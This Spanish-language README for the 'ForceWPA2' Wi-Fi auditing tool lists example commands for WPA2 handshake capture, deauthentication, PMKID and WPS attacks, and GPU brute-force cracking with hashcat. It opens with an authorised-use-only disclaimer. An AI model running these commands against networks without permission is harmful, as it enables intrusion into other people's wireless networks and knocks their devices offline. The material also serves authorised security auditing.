# ForceWPA2 ⚡

Herramienta automatizada para auditoría WPA2: captura de handshake + fuerza bruta con GPU.

## ⚠️ LEGAL DISCLAIMER
**Solo para uso educativo y auditorías con autorización expresa.**  
Usar contra redes sin permiso es **ilegal**. El autor no se hace responsable.

## 🚀 Funcionalidades
- Captura de handshake (aireplay-ng / scapy)
- Deauth attack para forzar reconexión
- Fuerza bruta con wordlist (rockyou.txt o custom)
- **Soporte GPU** via hashcat
- Diccionarios integrados + descarga automática de rockyou.txt

## 📦 Requisitos
```bash
sudo apt install aircrack-ng hashcat
pip install scapy

🎯 Comandos de ejemplo con nuevas opciones
# Escaneo detallado
sudo python3 forcewpa2.py -i wlan0 --scan-only -v

# Múltiples diccionarios en cascada
sudo python3 forcewpa2.py -i wlan0 -b AA:BB:CC:DD:EE:FF --wordlists rockyou.txt passwords.txt spanish.txt --gpu

# Ataque por máscara (8 dígitos numéricos)
sudo python3 forcewpa2.py -i wlan0 -b AA:BB:CC:DD:EE:FF --mask '?d?d?d?d?d?d?d?d' --gpu

# Captura PMKID (más rápido, sin clients)
sudo python3 forcewpa2.py -i wlan0 --pmkid

# Ataque WPS completo
sudo python3 forcewpa2.py -i wlan0 -b AA:BB:CC:DD:EE:FF --wps

# Usar handshake existente + reglas hashcat
sudo python3 forcewpa2.py -i wlan0 --handshake captura.cap -w rockyou.txt --rules best64.rule --gpu

# Con notificaciones y output JSON
sudo python3 forcewpa2.py -i wlan0 --scan-only --notify --output resultados.json

# Deauth agresivo (nivel 10)
sudo python3 forcewpa2.py -i wlan0 -b AA:BB:CC:DD:EE:FF --deauth 10

# Time limit de 5 minutos
sudo python3 forcewpa2.py -i wlan0 -b AA:BB:CC:DD:EE:FF --max-time 300
